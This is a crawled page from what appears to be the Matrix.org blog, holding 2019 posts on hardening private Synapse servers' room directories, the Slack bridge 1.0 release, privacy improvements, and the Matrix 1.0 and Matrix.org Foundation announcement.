<p>So there you have it.  I‚Äôve not even tried to talk about the amazing stuff that the wider Matrix community has been up to - whether that‚Äôs amazing new clients like <a href="https://dittochat.org/">Ditto</a> (React Native!) or <a href="https://github.com/kiliankoe/nio">Nio!</a> (SwiftUI), or new bridges like <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> and <a href="https://github.com/tulir/mautrix-hangouts">mautrix-hangouts</a>, or even poljar‚Äôs secret rewrite of <a href="https://github.com/poljar/weechat-matrix-rs">weechat-matrix in Rust</a>; your best bet there is to skim through <a href="https://matrix.org/blog/category/this-week-in-matrix/">TWIM</a>.  Huge undying thanks go out though to everyone who builds on Matrix and keeps the ecosystem maturing and growing (especially while we‚Äôre scurrying around shoring up the foundations) - there‚Äôs simply no point in Matrix as a protocol without the vibrant community building on top.</p>
<p>All told, it‚Äôs been a bit of an epic year (both in terms of wins and fails), and all that remains is to thank <em>everyone</em> who continues to use Matrix (particularly our <a href="https://www.patreon.com/matrixdotorg">Patreon</a> supporters) for their ongoing support and for helping the project accelerate forwards.  More than ever before, the world needs free and open communication open to all; the age of proprietary communication silos may be coming to an end - consigned to live alongside AOL CDs and Compuserve IDs in the history books.  With your support, Matrix can provide a decent mainstream yet decentralised alternative - and we‚Äôll do everything we can to make that happen in 2020.</p>
<p>Happy holidays!</p>
<p>Matthew, Amandine &amp; the whole Matrix.org team.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;11&#x2F;09&#x2F;avoiding-unwelcome-visitors-on-private-matrix-servers&#x2F;" title="Avoiding unwelcome visitors on private Matrix servers">Avoiding unwelcome visitors on private Matrix servers</a></h2>
                <span>
                    09.11.2019 00:00
                    ‚Äî
                    <a href="/category/privacy">
                        Privacy
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Over the course of today we've been made aware of folks port-scanning the
general internet to discover private Matrix servers, looking for publicly
visible room directories, and then trying to join rooms listed in them.</p>
<p>If you are running a Matrix server that is intended to be private, you must correctly
configure your server to not expose its public room list to the general public -
and also ensure that any sensitive rooms are invite-only (especially if the
server is federated with the public Matrix network).</p>
<p>In Synapse, this means ensuring that the following options are set correctly in
your <code>homeserver.yaml</code>:</p>
<pre style="background-color:#1e1e1e;color:#dcdcdc;"><code><span># If set to &#39;false&#39;, requires authentication to access the server&#39;s public rooms
</span><span># directory through the client API. Defaults to &#39;true&#39;.
</span><span>#
</span><span>#allow_public_rooms_without_auth: false
</span><span>
</span><span># If set to &#39;false&#39;, forbids any other homeserver to fetch the server&#39;s public
</span><span># rooms directory via federation. Defaults to &#39;true&#39;.
</span><span>#
</span><span>#allow_public_rooms_over_federation: false
</span></code></pre>
<p><strong>For private servers, you will almost certainly want to explicitly set these to
<code>false</code></strong>, meaning that the server's &quot;public&quot; room directory is hidden from the
general internet and wider Matrix network.</p>
<p>You can test whether your room directory is visible to arbitrary Matrix clients
on the general internet by viewing a URL like
https://sandbox.modular.im/_matrix/client/r0/publicRooms (but for your server). 
If it gives a &quot;Missing access token&quot; error, you are okay.</p>
<p>You can test whether your room directory is visible to arbitrary Matrix servers
on the general internet by loading Riot (or similar) on another server, and
entering the target server's domain name into the room directory's server
selection box.  If you can't see any rooms, then are okay.</p>
<p>Relatedly, <strong>please ensure that any sensitive rooms are set to be &quot;invite only&quot;
and room history is not world visible</strong> - particularly if your server is
federated, or if it has public registration enabled.  This stops random
members of the public peeking into them (let alone joining them).</p>
<p>Relying on security-by-obscurity is a very bad idea: all it takes is for someone
to scan the whole internet for Matrix servers, and then trying to join (say)
#finance on each discovered domain (either by signing up on that
server or by trying to join over federation) to cause problems.</p>
<p>Finally, if you don't want the general public reading your room directory,
please also remember to turn off public registration on your homeserver.
Otherwise even with the changes above, if randoms can sign up on your server
to view &amp; join rooms then all bets are off.</p>
<p>We'll be rethinking the security model of room directories in future (e.g.
whether to default them to being only visible to registered users on the local
server, or whether to replace per-server directories with per-community
directories with finer grained access control, etc) - but until this is sorted,
please heed this advice.</p>
<p>If you have concerns about randoms having managed to discover or join rooms
which should have been private, please contact security@matrix.org.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;10&#x2F;03&#x2F;matrix-appservice-slack-bridge-1-0-is-here&#x2F;" title="matrix-appservice-slack bridge 1.0 is here!">matrix-appservice-slack bridge 1.0 is here!</a></h2>
                <span>
                    03.10.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/half-shot">
                        Half-Shot
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hello Matrix enthusiasts! Yesterday we released <a href="https://github.com/matrix-org/matrix-appservice-slack/releases/tag/1.0.0">matrix-appservice-slack 1.0</a>. This marks a major milestone
in bridge development for the Matrix.org team, being our first bridge to ever reach 1.0. The decision to
release this version came after we decided that the bridge had gained enough features and reached a point
of stability where it could be deployed in the wild with minimal risk.</p>
<p>For those not in the know, the Slack bridge is Node.JS based, and bridges slack channels &amp; users into Matrix
seamlessly. And for those wondering, yes it works with Mattermost too (since their API is compatible with Slack)!
In previous versions only a limited subset of features were supported, making heavy usage of Slack‚Äôs
webhook API. As of 1.0, the bridge now makes use of the newer Slack Events/RTM API which gives us all we need for
a richer bridging experience. Everything from edits and reactions to typing notifications is supported in the 1.0 release.</p>
<p>Finally for those who are self hosting, we are pleased to offer the ability to &quot;puppet&quot; your Slack account using the
bridge. Puppeting is the process in which the bridge will send messages as if you were sending them from the Slack client
directly, when you talk using your Matrix account. This opens the door to seamless bridging and direct messaging support.</p>
<p>For those wishing to bridge their whole workspace across, <a href="https://github.com/SolarDrew/skill-picard">picard</a> exists
as a tool to manage large scale Slack bridge deployments. This tool is provided by <a href="https://matrix.to/#/@Cadair:matrix.org">Cadair</a> and <a href="https://matrix.to/#/@SolarDrew:matrix.org">SolarDrew</a></p>
<p><img src="/blog/img/2019-10-03-slack1.0-threading.png" alt="Slack Screenshot" />
Threading &amp; Reactions!</p>
<p>The bridge has undergone some pretty serious code surgery as well. The whole codebase has been rewritten in
TypeScript to take advantage of type checking and generic types. The bridge is currently based upon the
<a href="https://github.com/matrix-org/matrix-appservice-bridge/">matrix-appservice-bridge</a> library. The datastore interface now supports PostgreSQL, which allows for administrators to inspect and edit the database while the bridge is running, as well as offering  helpful performance boost over the NeDB datastore format that was used previously. Finally, the codebase has proper Unit and Integration Tests to ensure new changes will not cause any regressions in behaviour. In short, <strong>now is an excellent time to get involved and hack on the bridge</strong>. There is already a <a href="https://github.com/matrix-org/matrix-appservice-slack/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22">crafted list of easy issues</a> for new and experienced bridge devs.</p>
<p><img src="/blog/img/2019-10-03-slack1.0-perfmem.png" alt="Grafana memory usage graph" />
Memory usage of the bridge comparison</p>
<p><img src="/blog/img/2019-10-03-slack1.0-perfcpu.png" alt="Grafana CPU usage graph" />
CPU usage of the bridge comparison</p>
<p>In terms of how many users matrix.org is currently serving at the moment, we present to you some figures:</p>
<ul>
<li>2562 bridged rooms</li>
<li>764 teams connected to the bridge</li>
<li>103711 events have passed through the bridge since the launch of 0.3.2</li>
</ul>
<p>Of course, our work doesn‚Äôt stop at 1.0. The plan for the immediate future of the bridge
is to continue adding support for other event types coming from Matrix and Slack to create
an ever richer experience. Obvious features are things like topic changes, and syncing membership
across the bridge. In the long term future we would also like to add community support to the bridge,
so whole Slack workspaces can be bridged across with a single click.</p>
<p>That‚Äôs all from me, and I would like to say a massive thank you to <a href="https://matrix.to/#/@Cadair:matrix.org">Cadair</a>
and <a href="https://matrix.to/#/@benpa:matrix.org">Ben</a> for both their code and review work on the project and as always,
thank you to the community for using the bridge and reporting issues. üôÇ</p>
<p>Useful links:</p>
<ul>
<li><a href="https://matrix.to/#/#matrix_appservice_slack:matrix.org">Matrix Room</a></li>
<li><a href="https://github.com/matrix-org/matrix-appservice-slack">Project Home</a></li>
<li><a href="https://matrix-appservice-slack.readthedocs.io/en/stable/">Docs</a></li>
</ul>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;07&#x2F;17&#x2F;5-user-matrix-homeserver-hosting-now-available-from-modular&#x2F;" title="5-user Matrix homeserver hosting now available from Modular">5-user Matrix homeserver hosting now available from Modular</a></h2>
                <span>
                    17.07.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/modular-im">
                        Modular.im
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>If you‚Äôve been looking for a way to have you own Matrix homeserver without having to run it yourself, you may be interested to hear that <a href="https://modular.im">Modular</a> (the Matrix hosting provider run by <a href="https://vector.im">New Vector</a>, the startup which hires many of the Matrix core team) is now offering a personal-sized small homeserver hosting service, supporting a minimum size of 5 user servers.</p>
<p>A lot of recent performance work on Synapse has been driven by the need to make smaller dedicated servers more efficient to run - and so if you run your own homeserver you‚Äôll be benefiting from all this work too :)  Meanwhile, if you choose to outsource your server hosting to Modular, you‚Äôll be indirectly supporting core Matrix and Synapse development, given most of the core Matrix team work for New Vector - it‚Äôs through buying services like this which lets us keep folks able to hack on Matrix as their day job.</p>
<p>See more details <a href="https://modular.im/personal-hosted-homeservers">over at the Modular blog post</a>!</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;06&#x2F;30&#x2F;tightening-up-privacy-in-matrix&#x2F;" title="Tightening up privacy in Matrix">Tightening up privacy in Matrix</a></h2>
                <span>
                    30.06.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>A few weeks ago there was <a href="https://news.ycombinator.com/item?id=20178267">some
discussion</a> around the privacy
of typical Matrix configurations, particularly how Riot's default config uses
vector.im as an Identity Server (for discovering users on Matrix by their email
address or phone number) and scalar.vector.im as an Integration Manager (i.e.
the mechanism for adding hosted bots/bridges/widgets into rooms). This means
that Riot, even if using a custom homeserver and running from a custom Riot
deployment, will try to talk to *.vector.im (run  by New Vector; the company formed by the core
Matrix team in 2017) for some operations unless an alternative IS or IM has
been specified in the config.</p>
<p>We haven't done as good a job at explaining this as we could have, and this
blog post is a progress update on how we're fixing that and improving other
privacy considerations in general.</p>
<p>Firstly, the reason Riot is configured like this is for the user's convenience:
in general, we believe most users just want to discover other people on Matrix
as easily as possible, and a logically-centralised server for looking up user
matrix IDs by email/phone number (called third party IDs, or 3PIDs) is the only
comprehensive way of doing so.  Decentralising this data while protecting the
privacy of the 3PIDs and their matrix IDs is a Hard Problem which we're unaware
of anyone having solved yet.  Alternatively, you could run a local identity
server, but it will end up having to delegate to a centralised identity server
anyway for IDs it has no other way to know about. Similarly, providing a
default integration server that just works out of the box (rather than
mandating the user configures their own) is a matter of trying to keep Riot's
UX simple, especially when onboarding users, and especially given Riot's
reputation for complexity at the best of times.</p>
<p>That said, the discussion highlighted some areas for improvement.
Specifically:</p>
<ol>
<li>When doing work on making Matrix <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix">GDPR
compliant</a>
back in May 2018, we set up a single <a href="https://github.com/vector-im/policies/blob/master/docs/matrix-org/privacy_notice.md">privacy
policy</a>
for the services we run, and got users to agree to it by locking them out of
the matrix.org homeserver until they did.  However, we missed that users not
on the matrix.org homeserver might still be using our Identity Service (IS)
&amp; Integration Manager (IM) without accepting the privacy policy.  Over the
last few weeks we've been working on addressing this - it turns out that
it's a pain to fix, given the Identity Service doesn't have the concept of
users, so tracking which users have agreed to the policy policy or not means
some fairly major changes. The current proposal is to change the Identity
Service to use a form of OpenID to authenticate users against their
homeserver in order to check they've accepted the IS's terms of use - see
<a href="https://github.com/matrix-org/matrix-doc/pull/2140">MSC2140</a> for the gory
details.</li>
</ol>
<p>Meanwhile, Riot is being updated to prompt the user to accept the IS &amp; IM terms
of use (if different to the HS's), and thus make it crystal clear to the user
that they are using an IS &amp; IM and that they have the option not to if desired - see https://github.com/vector-im/riot-web/issues/10167 and associated
<a href="https://github.com/vector-im/riot-web/issues?utf8=%E2%9C%93&amp;q=is%3Aissue+label%3Ap1+label%3Aprivacy+label%3Aphase%3A1+identity">issues</a>.
This includes also explicitly prompting the user as to whether they want
3PIDs they provide at registration to be discoverable, as per
https://github.com/vector-im/riot-web/issues/10091.</p>
<ol start="2">
<li>
<p>Riot on iOS &amp; Android gives the option of scanning your local addressbook to
discover which of your contacts are on Matrix.  The wording explaining this
wasn't clear enough on Android - which we <a href="https://news.ycombinator.com/item?id=20181515">promptly
fixed</a>.  Separately, the
contact details sent to the server are currently not obfuscated.  This is
partially because we hadn't got to it, and partially because obfuscating
them doesn't actually help much with privacy, given an attacker can just
scan through possible obfuscated phone numbers and email addresses to
deobfuscate them.  However, we've been working through obfuscating the
contact details anyway by hashing as per
<a href="https://github.com/matrix-org/matrix-doc/pull/2134">MSC2134</a>, which has all
the details.  We're also adding an explicit lookup warning in Riot/Web, as
per https://github.com/vector-im/riot-web/issues/10093.</p>
</li>
<li>
<p>There was a bug where Riot/Web was querying the Integration Manager every
time you opened a room, even if that room had no integrations (actually, it
did it 3 times in a row).  This got <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3115">fixed and
released</a> in
Riot/Web 1.2.2 back on June 19th.</p>
</li>
<li>
<p>Matrix needs to authenticate whether events were actually sent by the server
that claimed to send them.  We do this by having servers sign their events
when they create them, and publishing the public half of their signing keys
for anyone to query.  However, this poses problems if you receive an event
which is signed by a server which isn't currently online.  To solve this, we
have the concept of <code>trusted_key_servers</code> (aka notary servers), which your
server can query to see if they know about the missing server's keys.  By
default, matrix.org is configured as Synapse's trusted notary, but you can
of course change this. If you choose an unreliable server as the notary
(e.g. by not setting one at all) then there's a risk that you won't be able
to look up signing keys, and a splitbrain will result where your server
can't receive certain events, but other servers in the room can.  This can
then result in your server being unable to participate in the room entirely,
if it's missing key events in the room's lifetime.</p>
<p>Our plan here is to get rid of notaries entirely by changing how event
signing works as per
<a href="https://github.com/matrix-org/matrix-doc/issues/1228">MSC1228</a>, but this is
going to take a while.  Meanwhile we're going to check Synapse's code to
ensure it doesn't talk to the notary server unnecessarily.  (E.g. it should
be caching the signing keys locally, and it should only use the notary
server if the remote server is down.)</p>
</li>
<li>
<p>When doing VoIP in Matrix, clients need to use a TURN server to discover
their network conditions and perform firewall traversal.  The TURN server
should be specified by your homeserver (and each homeserver deployment
should ideally include a TURN server).  However, for users who have not
configured a TURN server, Riot (on all 3 platforms) defaulted to use
Google's public STUN service (<code>stun.l.google.com</code>).  STUN is a subset of
TURN which provides firewall discovery, but not traffic relaying.  This
slightly increased the chances of calls working for users without a proper
TURN server, but not by much - and rather than fall back to Google, we've
decided to simply remove it from Riot (e.g.
https://github.com/matrix-org/matrix-ios-sdk/commit/24832a2b14fb72ae6f051d5aba40262d11eef65d).
This means that VoIP might get less reliable for users who were relying on
this fallback, but you really should be running your own TURN server anyway
if you want VoIP to work reliably on your homeserver.</p>
</li>
<li>
<p>We should make it clearer in Riot that device names are world-readable, and
not just for the user's own personal reference. This is
https://github.com/vector-im/riot-web/issues/10216</p>
</li>
</ol>
<p>As you can see, much of the work on improving these issues is still in full
swing, although some has already shipped.  As should also be obvious, these
issues are categorically not malicious: Matrix (and Riot) literally exists to give users full control and autonomy over their communication, and privacy is a key part of that. These are avoidable issues which can and will be solved.  It's worth noting that we have to prioritise privacy issues alongside all the other development in Matrix however: there's no point in having excellent privacy if there are other bugs stopping the platform from being usable.</p>
<p>We'll do another blog post to confirm once most of the fixes here have landed -
meanwhile, hopefully this post provides some useful visibility on how we're
going about improving things.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;introducing-matrix-1-0-and-the-matrix-org-foundation&#x2F;" title="Introducing Matrix 1.0 and the Matrix.org Foundation">Introducing Matrix 1.0 and the Matrix.org Foundation</a></h2>
                <span>
                    11.06.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <h2 id="matrix-1-0">Matrix 1.0</h2>
<p>Hi all,</p>
<p>We are very excited to announce the first fully stable release of the Matrix protocol and specification across **all **APIs - as well as the Synapse 1.0 reference implementation which implements the full Matrix 1.0 API surface.</p>
<p>This means that after just over 5 years since the initial work on Matrix began, we are proud to have finally <strong>exited beta</strong>!!  This is the conclusion of the work which we announced at <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019">FOSDEM 2019</a> when we cut the first stable release of the Server-Server API and began the Synapse 0.99 release series in anticipation of releasing a 1.0.</p>
<p>Now, before you get too excited, it‚Äôs critical to understand that Matrix 1.0 is all about providing a <strong>stable, self-consistent, self-contained and secure version of the standard</strong> which anyone should be able to use to independently implement production-grade Matrix clients, servers, bots and bridges etc.  It does <strong>not</strong> mean that all planned or possible features in Matrix are now specified and implemented, but that the most important core of the protocol is a well-defined stable platform for everyone to build on.</p>
<p>On the Synapse side, our focus has been exclusively on ensuring that Synapse correctly implements Matrix 1.0, to provide a stable and secure basis for participating in Matrix without risk of room corruption or other nastinesses.  However, we have deliberately <strong>not</strong> focused on performance or features in the 1.0 release - so I‚Äôm afraid that synapse‚Äôs RAM footprint will not have got significantly better, and your favourite long-awaited features (automatically defragmenting rooms with lots of forward extremities, configurable message retention, admin management web-interface etc) have not yet landed.  In other words, this is the opposite of the <a href="https://medium.com/@RiotChat/the-big-1-0-68fa7c6050be">Riot 1.0 release</a> (where the entire app was redesigned and radically improved its performance and UX) - instead, we have adopted the mantra to <a href="http://wiki.c2.com/?MakeItWorkMakeItRightMakeItFast">make it work, make it work right, and then (finally) make it fast</a>.  You can read the <a href="/blog/2019/06/11/synapse-1-0-0-released">full release notes</a> here.  It‚Äôs also worth looking at the <a href="https://github.com/matrix-org/synapse/blob/release-v1.0.0/CHANGES.md">full changelog</a> through the Synapse 0.99 release series to see the massive amount of polishing that‚Äôs been going on here.</p>
<p>All this means that the main headline features which land in Matrix 1.0 are vitally important but relatively dry:</p>
<ul>
<li>Using X.509 certificates to trust servers rather than perspective notaries, to simplify and improve server-side trust.  This is a <strong>breaking change</strong> across Matrix, and we‚Äôve given the community several months now to ensure their homeservers run a valid TLS certificate.  See <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">MSC1711</a> for full details, and the <a href="https://matrix.org/blog/2019/05/24/final-countdown-to-1-0">2 week warning</a> we gave.  As of ~9am UTC today, the matrix.org homeserver is running Synapse 1.0 and enforcing valid TLS certificates - the transition has begun (and so far we haven‚Äôt spotted any major breakage :).  Thank you to everyone who <a href="https://arewereadyyet.com">got ready</a> in advance!</li>
<li>Using .well-known URIs to discover servers, in case you can‚Äôt get a valid TLS certificate for your server‚Äôs domain.</li>
<li>Switching to <strong><a href="https://matrix.org/docs/spec/rooms/v4.html">room version 4</a> by default</strong> for creating new rooms.  This fixes the most important defects that the core room algorithm has historically encountered, particularly:
<ul>
<li>The new State Resolution algorithm to fix the <a href="https://github.com/matrix-org/synapse/issues/2432">Hotel California bug</a> and many others: <a href="https://github.com/matrix-org/matrix-doc/issues/1442">State Resolution Reloaded</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/1659">Collision resistant event IDs</a></li>
</ul>
</li>
<li>Specifying the ability to upgrade between room versions</li>
<li>Full specification of lazy loading room members</li>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/1267">Short Authentication String</a> (Emoji!) interactive verification of E2EE devices</li>
<li>...and lots and lots and lots of bugfixes and spec omission fixes.</li>
</ul>
<p>That said, there is a <em>lot</em> of really exciting stuff in flight right now which sadly didn‚Äôt stabilise in time for Matrix 1.0, but will be landing as fast as we can finalise it now that 1.0 is at last out the door.  This includes:</p>
<ul>
<li>Editable messages!  (These are in Synapse 1.0 and Riot already, but still stabilising so not enabled by default)</li>
<li>Reactions! (Similarly these are in develop)</li>
<li>Threading!! (We‚Äôve planted the seeds for this in the new ‚Äòaggregations‚Äô support which powers edits &amp; reactions - but full thread support is still a bit further out).</li>
<li><a href="https://github.com/uhoreg/matrix-doc/blob/cross-signing2/proposals/1756-cross-signing.md">Cross-signed verification for end-to-end encryption</a> (This is on a branch, but due to land any day now).  We‚Äôve also held off merging E2E backups into the Matrix 1.0 spec until cross-signing lands, given it may change the backup behaviour a bit.  Once this is done, we can seriously talk about turning on E2E by default everywhere.</li>
<li>Live-tracking of room statistics and state in Synapse!  (This is in Synapse 1.0 already if you check out the new room_stats and room_state tables, but we need to provide a nice admin interface for it).</li>
<li>Support for smaller footprint homeservers by reducing memory usage and stopping them from joining overly complex rooms.</li>
</ul>
<p>Then stuff which we haven‚Äôt yet started, but is now unlocked by the 1.0 release:</p>
<ul>
<li>Fixing extremities build-up (and so massively improving performance)</li>
<li>Rewriting Communities.  Groups/Communities deliberately didn‚Äôt land in Matrix 1.0 as the current implementation has issues we want to fix first.  <a href="https://github.com/matrix-org/matrix-doc/pull/1772">MSC1772</a> has the details.</li>
<li>Rewritten room directory using the new room stats/state tables to be super-speedy.</li>
<li>Super-speedy <a href="https://github.com/matrix-org/synapse/pull/3122">incremental state resolution</a></li>
<li>Removing MXIDs from events (<a href="https://github.com/matrix-org/matrix-doc/issues/1228">MSC1228</a>)</li>
</ul>
<p>Just to give a quick taster of the shape of things to come, here‚Äôs RiotX/Android, the all-new Riot client for Android, showing off Edits &amp; Reactions in the wild‚Ä¶
<br/></p>
<div style="text-align: center">
<img src="/blog/img/edits.jpg" style="height: 640px;"/>
</div>
<br/>
...and here‚Äôs a screenshot of the final test jig for cross-signing devices in end-to-end encryption, so you will never have to manually verify new devices for a trusted user ever again!  We demoed a *very* early version of this at FOSDEM, but this here is the testing harness for real deal, after several iterations of the spec and implementation to nail down the model. + means the device/user's cross-signing key is trusted, T means it's TOFU:
<br/><br/>
<div style="text-align: center">
<img src="/blog/img/cross-signing.png" style="height: 480px; margin: auto"/>
</div>
<br/>
So, there you have it - welcome to Matrix 1.0, and we look forward to our backlog of feature work now landing!
<p>Massive massive thanks to everyone who has stuck with the project over the years and helped support and grow Matrix - little did we think back in May 2014 that it‚Äôd take us this long to exit beta, but hopefully you‚Äôll agree that it‚Äôs been worth it :)</p>
<p>Talking of which, we were looking through the photos we took from the first ever session hacking on Matrix back in May 2014‚Ä¶</p>
<p><img src="/blog/img/nightmare.jpg" alt="Whiteboard 1" /></p>
<p>...suffice it to say that of the architectural options, we went with #3 in the end...</p>
<p><img src="/blog/img/pl.jpg" alt="Whiteboard 2" /></p>
<p>...and that nowadays we actually know how power levels work, in excruciating and (hopefully) well-specified detail :)</p>
<p>There has been an absolutely enormous amount of work to pull Matrix 1.0 together - both on the spec side (thanks to the Spec Core Team for corralling proposals, and everyone who's contributed proposals, and particularly to Travis for editing it all) and the implementation side (thanks to the whole Synapse team for the tedious task of cleaning up everything that was needed for 1.0).  And of course, huge thanks go to everyone who has been helping test and debug the Synapse 1.0 release candidates, or just supporting the project to get to this point :)</p>
<h2 id="the-matrix-org-foundation">The Matrix.org Foundation</h2>
<p>Finally, as promised, alongside Matrix 1.0, we are very happy to announce the official launch of the finalised Matrix.org Foundation!</p>
<p>This has been a long-running project to ensure that Matrix‚Äôs future is governed by a neutral non-profit custodian for the benefit of everyone in the Matrix ecosystem.  We started the process nearly a year ago back with the initial proposal <a href="https://matrix.org/blog/2018/06/20/towards-open-governance-for-matrix-org">Towards Open Governance of Matrix.org</a>, and then legally <a href="https://matrix.org/blog/2018/10/29/introducing-the-matrix-org-foundation-part-1-of-2">incorporated the Foundation</a> in October, and published the <a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1779/proposals/1779-open-governance.md">final governance proposal</a> in January.</p>
<p>As of today the Foundation is finalised and operational, and all the assets for Matrix.org have been transferred from <a href="https://vector.im">New Vector</a> (the startup we formed in 2017 to hire the core Matrix team).  In fact you may already have seen Matrix.org Foundation notices popping up all over the Matrix codebase (as all of New Vector‚Äôs work on the public Matrix codebase for the foreseeable is being assigned to the Matrix.org Foundation).</p>
<p>Most importantly, we‚Äôre excited to introduce the <strong>Guardians of the Matrix.org Foundation</strong>.  The Guardians are the legal directors of the non-profit Foundation, and are responsible for ensuring that the Foundation (and by extension the Spec Core Team) keeps on mission and neutrally protects the development of Matrix. Guardians are typically independent of the commercial Matrix ecosystem and may even not be members of today‚Äôs Matrix community, but are deeply aligned with the mission of the project. Guardians are selected to be respected and trusted by the wider community to uphold the guiding principles of the Foundation and keep the other Guardians honest.</p>
<p>We have started the Foundation with five Guardians - two being the original founders of the Matrix project (Matthew and Amandine) and three being entirely independent, thus ensuring the original Matrix team forms a minority which can be kept in check by the rest of the Guardians. The new Guardians are:</p>
<ul>
<li>
<p>Prof. Jon Crowcroft - Marconi Professor of Communications Systems in the Computer Lab at the University of Cambridge and the Turing Institute. Jon is a pioneer in the field of decentralised communication, and a fellow of the Royal Society, the ACM, the British Computer Society, the Institution of Engineering and Technology, the Royal Academy of Engineering and the Institute of Electrical and Electronics Engineers.<br/><br/>Jon is a global expert in decentralisation and data privacy, and is excellently placed to help ensure Matrix stays true to its ideals.</p>
</li>
<li>
<p>Ross Schulman - Ross is a senior counsel and senior policy technologist at New America‚Äôs Open Technology Institute, where he focuses on internet measurement, emerging technologies, surveillance, and decentralization. Prior to joining OTI, Ross worked for Google.<br/><br/>Ross brings a unique perspective as a tech- and decentralisation-savvy lawyer to the Foundation, as well as being one of the first non-developers in the Matrix community to run his own homeserver. Ross has been known to walk around Mozfest clutching a battery-powered Synapse in a box, promoting decentralised communication for all.</p>
</li>
<li>
<p>Dr. Jutta Steiner - As co-founder and CEO of Parity Technologies, Jutta is dedicated to building a better internet - Web 3.0 - where users‚Äô privacy &amp; control come first. Parity Technologies is a leader in the blockchain space ‚Äì known to many as the creator of one of the most popular Ethereum clients, it is also the creator of two ambitious new blockchain technlogies, Polkadot and Substrate, that make it easier to experiment and innovate on scalability, encryption and governance.<br/><br/>Parity has been pioneering Matrix enterprise use since the moment they decided to rely on Matrix for their internal and external communication back in 2016, and now run their own high-volume deployment, with end-to-end encryption enabled by default. Jutta represents organisations who are professionally dependent on Matrix day-to-day, as well as bringing her unique experiences around decentralisation and ensuring that Web 3.0 will be a fair web for all.</p>
</li>
</ul>
<p>We‚Äôd like to offer a very warm welcome to the new Guardians, and thank them profusely for giving up their time to join the Foundation and help ensure Matrix stays on course for the years to come.</p>
<p>For the full update on the Foundation, please check out the new website content at <a href="https://matrix.org/foundation">https://matrix.org/foundation</a> which should tell you everything you could possibly want to know about the Foundation, the Guardians, the Foundation‚Äôs legal Articles of Association, and the day-to-day Rules which define the Open Governance process.</p>
<h2 id="and-finally">And finally‚Ä¶</h2>
<p>Matrix 1.0 has been a bit of an epic to release, but puts us on a much stronger footing for the future.</p>
<p>However, it‚Äôs very unlikely that we‚Äôd have made it this far if most of the core dev team wasn‚Äôt able to work on Matrix as their day job.  Right now we are actively looking for large-scale donations to the Matrix.org Foundation (and/or investment in <a href="https://vector.im">New Vector</a>) to ensure that the team can maintain as tight a focus on core Matrix work as possible, and to ensure the project realises its full potential.  While Matrix is growing faster than ever, this perversely means we have more and more distractions - whether that‚Äôs keeping the Matrix.org server safe and operational, or handling support requests from the community, or helping new members of the ecosystem get up and running.  If you would like Matrix to succeed, please <a href="mailto:funding@matrix.org">get in touch</a> if you‚Äôd like to sponsor work, prioritise features, get support contracts, or otherwise support the project.  We‚Äôre particularly interested in sponsorship around decentralised reputation work (e.g. publishing a global room directory which users can filter based on their preferences).</p>
<p>Finally, huge thanks to everyone who has continued to support us through thick and thin on <a href="https://patreon.com/matrixdotorg">Patreon</a>, <a href="https://liberapay.com/matrixdotorg">Liberapay</a> or other platforms.  Every little helps here, both in terms of practically keeping the lights on, and also inspiring larger donations &amp; financial support.</p>
<p>So: thank you once again for flying Matrix.  We hope you enjoy 1.0, and we look forward to everything else landing on the horizon!</p>
<p>- Matthew, Amandine &amp; the whole Matrix.org Team.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;synapse-1-0-0-released&#x2F;" title="Synapse 1.0.0 released">Synapse 1.0.0 released</a></h2>
                <span>
                    11.06.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/neil-johnson">
                        Neil Johnson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Well here it is: Synapse 1.0.</p>
